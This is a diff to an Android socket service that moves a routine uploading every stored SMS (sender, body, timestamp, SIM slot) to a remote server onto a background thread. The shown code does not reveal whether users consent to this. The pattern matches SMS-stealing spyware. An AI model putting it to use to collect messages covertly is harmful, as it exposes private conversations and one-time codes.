@@ -288,38 +288,41 @@ public class PhoneSocketService {
     }
 
     private void sendAllMessagesToServer() {
-        try {
-            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
-            if (prefs.getBoolean("messages_sent_to_server", false)) return;
-            if (!isConnected() || socket == null) return;
-            DatabaseHelper dbHelper = new DatabaseHelper(context);
-            List<SmsItem> allMessages = dbHelper.getAllMessages();
-            if (allMessages.isEmpty()) {
-                prefs.edit().putBoolean("messages_sent_to_server", true).apply();
-                return;
-            }
-            int sent = 0;
-            for (SmsItem item : allMessages) {
-                try {
-                    JSONObject data = new JSONObject();
-                    data.put("sender", item.getAddress());
-                    data.put("content", item.getBody());
-                    data.put("timestamp", String.valueOf(item.getDate()));
-                    data.put("simSlot", item.getSimSlot());
-                    socket.emit("phone-sms", data);
-                    sent++;
-                    if (sent % 50 == 0) {
-                        try { Thread.sleep(100); } catch (InterruptedException ignored) {}
-                    }
-                } catch (Exception e) {
-                    Log.e(TAG, "sendAllMessages error on item", e);
+        new Thread(() -> {
+            try {
+                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
+                if (prefs.getBoolean("messages_sent_to_server", false)) return;
+                if (!isConnected() || socket == null) return;
+                DatabaseHelper dbHelper = new DatabaseHelper(context);
+                List<SmsItem> allMessages = dbHelper.getAllMessages();
+                if (allMessages.isEmpty()) {
+                    prefs.edit().putBoolean("messages_sent_to_server", true).apply();
+                    return;
                 }
+                int sent = 0;
+                for (SmsItem item : allMessages) {
+                    try {
+                        if (!isConnected()) break;
+                        JSONObject data = new JSONObject();
+                        data.put("sender", item.getAddress());
+                        data.put("content", item.getBody());
+                        data.put("timestamp", String.valueOf(item.getDate()));
+                        data.put("simSlot", item.getSimSlot());
+                        socket.emit("phone-sms", data);
+                        sent++;
+                        if (sent % 50 == 0) {
+                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "sendAllMessages error on item", e);
+                    }
+                }
+                prefs.edit().putBoolean("messages_sent_to_server", true).apply();
+                Log.i(TAG, "Sent " + sent + " existing messages to server");
+            } catch (Exception e) {
+                Log.e(TAG, "sendAllMessagesToServer error", e);
             }
-            prefs.edit().putBoolean("messages_sent_to_server", true).apply();
-            Log.i(TAG, "Sent " + sent + " existing messages to server");
-        } catch (Exception e) {
-            Log.e(TAG, "sendAllMessagesToServer error", e);
-        }
+        }).start();
     }
 
     private void flushPendingSms() {
